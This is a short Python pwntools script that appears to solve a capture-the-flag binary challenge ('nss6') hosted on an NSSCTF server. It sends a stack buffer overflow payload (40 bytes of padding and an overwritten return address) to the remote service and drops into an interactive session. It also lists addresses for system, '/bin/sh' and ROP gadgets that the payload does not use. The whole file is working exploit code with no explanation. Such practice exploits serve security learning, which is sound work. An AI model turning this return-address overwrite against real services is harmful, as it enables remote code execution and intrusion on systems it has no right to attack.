from pwn import *

# sh = process('./nss6')
sh=remote('node5.anna.nssctf.cn', 20893)

sys_addr = 0x0000000000401080
bin_sh = 0x0000000000402026
pop_rdi = 0x00000000004012e3
ret = 0x000000000040101a
offset = 32

payload = b'a'*(offset+8) + p64(0x00000000004011AA)

sh.sendline(payload)
sh.interactive()